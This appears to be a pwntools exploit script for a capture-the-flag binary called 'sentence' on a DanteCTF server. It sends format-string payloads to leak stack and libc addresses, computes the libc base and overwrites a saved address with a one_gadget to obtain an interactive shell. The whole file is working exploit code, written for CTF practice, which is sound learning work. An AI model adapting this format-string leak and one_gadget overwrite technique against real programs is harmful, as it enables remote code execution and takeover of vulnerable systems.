#!/usr/bin/env python3

from pwn import *

exe = ELF("sentence_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.dantectf.it", 31531)

    return r

r = conn()

sla = lambda a,b : r.sendlineafter(f'{a}', f'{b}')
ru = lambda a : r.recvuntil(f'{a}')


def main():
    format_string_payload = "%1$p %13$p"
    one_gadget = 0x50a37
    pop_rdi_off = 0x2a3e5
    pop_rbp = 0xa2e0# : pop rbp ; ret
    

    sla(":", format_string_payload)

    ru("Hi, ")
    leaks = r.recvline().split(b' ')[:2]
    leak1 = int(leaks[0][2:].decode('utf-8'),16)
    leak2 = int(leaks[1][2:].decode('utf-8'),16)
    print(hex(leak1))
    print(hex(leak2))
    overwrite_offset = leak1 + 0x2148

    print(hex(libc.address))
    print(hex(overwrite_offset))
    
    r.sendline(f'{str(leak2-0xE9)}')
    r.sendline(f'{str(overwrite_offset)}')
    # good luck pwning :)
    format_string_payload_2 = "%1$p %11$p"

    sla(":", format_string_payload_2)

    ru("Hi, ")
    leaks = r.recvline().split(b' ')[:2]
    leak1 = int(leaks[0][2:].decode('utf-8'),16)
    leak2 = int(leaks[1][2:].decode('utf-8'),16)
    print(hex(leak1))
    print(hex(leak2))
    libc.address = leak2 - 0x29D90
    overwrite_offset = leak1 + 0x2148
    r.sendline(f'{str(libc.address + one_gadget)}')
    r.sendline(f'{str(overwrite_offset)}')

    r.interactive()


if __name__ == "__main__":
    main()
